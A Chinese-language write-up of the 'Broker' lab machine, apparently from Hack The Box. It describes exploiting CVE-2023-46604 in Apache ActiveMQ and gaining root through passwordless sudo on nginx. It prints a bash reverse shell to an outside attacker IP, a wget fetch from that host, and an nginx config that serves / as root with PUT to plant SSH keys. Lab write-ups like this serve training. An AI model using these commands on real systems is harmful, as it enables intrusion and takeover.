## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Broker
2. 難度:Easy
3. IP:10.129.230.87

### 主要發現：
1. 漏洞 ：透過舊版本公開漏洞(CVE-2023-46604)利用不安全的反序列化達成遠端程式碼(RCE)執行（風險等級：Critical）
2. 漏洞 ：透過未設密碼的sudo配置達成權限提升（風險等級：High)

### 攻擊鏈摘要：

透過Nmap掃描或為改動的弱密碼登入均可獲得執行中的Apache ActiveMQ的舊版本(5.15.15)，存在公開漏洞(CVE-2023-46604)可使攻擊者利用JAVA語言不安全的反序列化取得控制權。系統帳號存在針對Nginx無須密碼的sudo權限，攻擊者可利用其權限以root架設Nginx伺服器，經過上傳SSH密鑰來獲取root權限。

### 潛在影響：

1. Apache ActiveMQ的舊版本(5.15.15)為非常嚴重(10.0)的公開漏洞，會使攻擊者輕易獲得系統權限，導致重要資料外洩。
2. 無須密碼的sudo權限的Nginx可使攻擊者隨意讀取root權限可讀寫的資料，甚至獲得權限提升，容易導致系統崩潰與機密資料外洩。
3. 若攻擊者透過SSH密鑰獲得root權限，且管理員為定時清除Nginx資料，攻擊者將獲得持久化後門，造成持續性的外洩風險。

### 修復建議：

1. 立即將Apache ActiveMQ提升至最新版本，並且更改預設(admin/admin)密碼。
2. sudo權限設立密碼，避免被不被信任的隨意濫用。
3. 管理員定期清除Nginx資料，避免被植入持久化後門。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.230.87
sudo nmap -sT -Pn -sV -sC -O -p22,80,1883,5672,36581,61616 10.129.230.87
sudo nmap --script=vuln -p22,80,1883,5672,36581,61616 10.129.230.87
```
<img width="723" height="265" alt="螢幕擷取畫面 2026-02-22 175545" src="https://github.com/user-attachments/assets/00b78858-7701-4619-99c7-b8c3084c5335" />
<img width="1426" height="772" alt="螢幕擷取畫面 2026-02-22 175712" src="https://github.com/user-attachments/assets/d4085d32-c843-4bea-87b5-0cee0279aaf4" />
<img width="808" height="313" alt="螢幕擷取畫面 2026-02-22 180611" src="https://github.com/user-attachments/assets/16509533-a308-4b8a-a4d1-7e3ce8f09a4c" />

探索80主頁

<img width="1313" height="635" alt="螢幕擷取畫面 2026-02-22 175620" src="https://github.com/user-attachments/assets/7f74df1a-2a67-43cf-9bcd-2cc44f5794dc" />


### 2.2 枚舉(Enumeration)

透過Google了解Apache ActiveMQ，得知預設密碼為admin/admin，並且成功進入

<img width="1039" height="675" alt="螢幕擷取畫面 2026-02-23 165603" src="https://github.com/user-attachments/assets/c0bfc73c-d424-4318-875d-7a9c5c5545bf" />
<img width="1864" height="521" alt="螢幕擷取畫面 2026-02-22 180133" src="https://github.com/user-attachments/assets/d8992c32-3118-486b-9476-a1014c3e359d" />

在網頁裡了解使用版本，與Nmap的結果一致

<img width="882" height="719" alt="螢幕擷取畫面 2026-02-22 180523" src="https://github.com/user-attachments/assets/ab5504d3-7a15-4d1f-aead-f02a76f98a26" />

Google尋找到公開漏洞及其PoC腳本

<img width="809" height="744" alt="螢幕擷取畫面 2026-02-22 180808" src="https://github.com/user-attachments/assets/c016d822-1ba3-473a-90b9-f901493fbea0" />
<img width="1189" height="758" alt="螢幕擷取畫面 2026-02-22 180938" src="https://github.com/user-attachments/assets/e5add340-bccd-4771-8fc0-4ba91372d7e4" />


### 2.3 初始存取(Initial Access)

下載腳本

<img width="1850" height="247" alt="螢幕擷取畫面 2026-02-22 181126" src="https://github.com/user-attachments/assets/2c47719e-ce24-49be-8ec7-db3c07661a75" />

找到可直接獲取Shell的自動化腳本

<img width="867" height="443" alt="螢幕擷取畫面 2026-02-22 183254" src="https://github.com/user-attachments/assets/2da1f382-7236-44cd-a3c6-25626721713f" />
<img width="600" height="87" alt="螢幕擷取畫面 2026-02-22 183719" src="https://github.com/user-attachments/assets/a02ee263-e9a7-4fea-817c-1acd5be0c1b0" />


### 2.4 橫向移動(Lateral Movement)

依靠腳本取得的Shell似乎不允許我移動到別的目錄，我選擇橫向移動到nc監聽中
```bash
/bin/bash -i >& /dev/tcp/10.10.14.229/1234 0>&1
nc -lvnp 1234
```
<img width="645" height="313" alt="螢幕擷取畫面 2026-02-22 185517" src="https://github.com/user-attachments/assets/4d713f01-c1e1-4372-9274-235645bc26b4" />
<img width="754" height="235" alt="螢幕擷取畫面 2026-02-22 185539" src="https://github.com/user-attachments/assets/085319c6-82dc-49ac-a68c-1270e2576ac0" />


### 2.5 權限提升(Privilege Escalation)

查看sudo權限，nginx無須密碼
```bash
sudo -l
```
<img width="944" height="185" alt="螢幕擷取畫面 2026-02-22 193744" src="https://github.com/user-attachments/assets/340700c8-da33-40c2-a3c0-e4ce3adb441e" />

建立root.conf設定檔，若想直接讀取root.txt，可不設PUT
```bash
nano root.conf
```
```bash
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

<img width="315" height="356" alt="螢幕擷取畫面 2026-02-22 193759" src="https://github.com/user-attachments/assets/58663a25-9773-4cf2-960a-121da0e3037c" />

利用Python伺服器託管後在nc監聽Shell中透過wget下載到可寫目錄中
```bash
python3 -m http.server 8000
wget http://10.10.14.229:8000/root.conf
```
<img width="634" height="78" alt="螢幕擷取畫面 2026-02-22 193811" src="https://github.com/user-attachments/assets/3288bc77-c460-4b6e-93c0-756da253c4c9" />
<img width="810" height="238" alt="螢幕擷取畫面 2026-02-22 193846" src="https://github.com/user-attachments/assets/a1cbfeaa-fa89-492d-98d8-1e11890f807d" />

以sudo權限建立nginx伺服器(成功則不會有回應)
```bash
sudo /usr/sbin/nginx -c /tmp/root.conf
```
<img width="632" height="51" alt="螢幕擷取畫面 2026-02-22 193914" src="https://github.com/user-attachments/assets/d6563fdb-964e-4ae5-8af5-db0996b1209b" />

使用curl檢查localhost:1338是否正確啟動，畫面回應根目錄即成功
```bash
curl localhost:1338
```
<img width="1121" height="662" alt="螢幕擷取畫面 2026-02-22 194234" src="https://github.com/user-attachments/assets/05d1ea54-aeca-440a-bc13-16f9eaaed152" />

在本機透過ssh-keygen建立SSH密鑰
```bash
ssh-keygen
```
<img width="741" height="456" alt="螢幕擷取畫面 2026-02-22 194708" src="https://github.com/user-attachments/assets/0d093647-b742-4da2-b4c9-e2a2950c5d17" />
<img width="932" height="69" alt="螢幕擷取畫面 2026-02-22 194723" src="https://github.com/user-attachments/assets/af317fdf-7b0a-4e83-9e2d-830942e73db8" />

使用curl在nginx伺服器設定SSH密鑰
```bash
curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 ......
```

<img width="939" height="112" alt="螢幕擷取畫面 2026-02-22 194934" src="https://github.com/user-attachments/assets/524872b5-737c-4998-b446-0b10bdcd980e" />

使用密鑰進行SSH連線
```bash
ssh -i id_ed25519 root@10.129.230.87
```
<img width="822" height="824" alt="螢幕擷取畫面 2026-02-22 195054" src="https://github.com/user-attachments/assets/71df74e7-915f-485f-818b-ea41999c996c" />


### 2.6 最終成果(Impact)

取得root權限及root.txt

<img width="1058" height="207" alt="螢幕擷取畫面 2026-02-22 195210" src="https://github.com/user-attachments/assets/2df95aa2-ae34-4e97-9ffe-f48901a0a2e6" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
